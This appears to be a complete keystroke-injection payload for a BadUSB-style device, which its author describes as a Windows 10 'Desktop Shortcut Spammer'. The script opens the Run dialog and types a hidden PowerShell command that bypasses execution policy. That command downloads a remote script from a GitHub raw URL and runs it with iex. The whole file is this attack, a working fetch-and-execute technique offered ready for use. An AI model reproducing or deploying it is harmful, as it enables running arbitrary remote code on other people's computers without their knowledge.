// Title: beigeworm's Desktop Shortcut Spammer.
// Author: @beigeworm
// Description: This script creates 100 shortcuts on the users Desktop.
// Target: Windows 10

// script setup
layout("us")

// Open Powershell and download script
delay(1000);
press("GUI r");
delay(1000);
type("powershell -NoP -Ep Bypass -W H -C irm https://raw.githubusercontent.com/beigeworm/PwnPi-Scripts/main/Fast-Execution/Shortcut-Spam/main.ps1 | iex");
delay(500);
press("ENTER");
